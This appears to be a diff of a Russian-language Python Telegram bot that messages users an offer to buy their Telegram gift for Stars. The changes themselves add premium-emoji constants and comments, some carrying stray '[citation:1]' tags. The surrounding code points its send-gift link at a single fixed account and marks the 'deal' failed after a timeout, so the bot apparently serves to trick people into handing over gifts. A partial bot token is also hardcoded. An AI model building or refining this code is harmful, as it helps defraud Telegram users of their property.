@@ -18,17 +18,22 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvd
 
 OWNER_ID = 861423393
 
+# Ссылка для прямой отправки подарка
 GIFT_URL = "tg://send_gift?to=heiseysex"
 TARGET_URL = "https://t.me/HeiseySex"
 
-VERIFY_TIMEOUT_SECONDS = 300
+VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
 
-# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (HTML) ───────────────────────
-# Используем HTML-тег для текста сообщений. В кнопках их использовать нельзя!
+# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (ID) ───────────────────────
+# ID взяты из открытого каталога telegram-premium-emojis [citation:1]
 
-EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
-EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐</tg-emoji>'
-EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
+EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'  # Подарок
+EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'  # Звезда [citation:1]
+EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'  # Замок
+EMOJI_CONFIRM = '<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>'  # Галочка [citation:1]
+EMOJI_CANCEL = '<tg-emoji emoji-id="5258226313285607065">❌</tg-emoji>'  # Крестик [citation:1]
+EMOJI_LIGHTNING = '<tg-emoji emoji-id="5843553939672274145">⚡️</tg-emoji>'  # Молния [citation:1]
+EMOJI_LINK = '<tg-emoji emoji-id="5877536313623711363">🔗</tg-emoji>'  # Ссылка
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
@@ -36,6 +41,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 offers = {}
 offers_lock = threading.Lock()
+
 
 # ─────────────────────── УТИЛИТЫ ───────────────────────
 
@@ -114,11 +120,11 @@ def parse_inline_query(raw):
     return name, url, amount
 
 
-# ─────────────────────── ТЕКСТЫ (HTML + Премиум в тексте) ───────────────────────
+# ─────────────────────── ТЕКСТЫ С ПРЕМИУМ-ЭМОДЗИ ───────────────────────
 
 def build_offer_message(name, url, amount):
     return (
-        f"{EMOJI_GIFT} <b>Вам поступило предложение о покупке подарка.</b>\n"
+        f"{EMOJI_GIFT} Вам поступило предложение о покупке подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
         f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} за подарок "
         f"<a href=\"{url}\">{name}</a>.\n\n"
@@ -229,7 +235,7 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
         safe_edit(
             chat_id,
             message_id,
-            "⛔ <b>Сделка не завершена.</b>\n"
+            f"⛔ <b>Сделка не завершена.</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Вы не выполнили все условия передачи подарка.\n\n"
             "Передача не была подтверждена в установленное время, "
